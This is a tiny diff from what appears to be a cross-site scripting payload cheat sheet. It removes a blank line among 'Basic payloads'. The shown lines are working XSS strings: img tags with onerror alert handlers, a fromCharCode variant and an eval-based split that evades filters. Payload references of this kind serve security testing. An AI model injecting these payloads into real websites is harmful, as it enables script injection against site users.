@@ -51,7 +51,6 @@ Basic payloads:
 "><img src=x onerror=alert('XSS');>
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
 
-
 <img src=x onerror="a='ale';b='rt(1)';eval(a+b);">
 
 
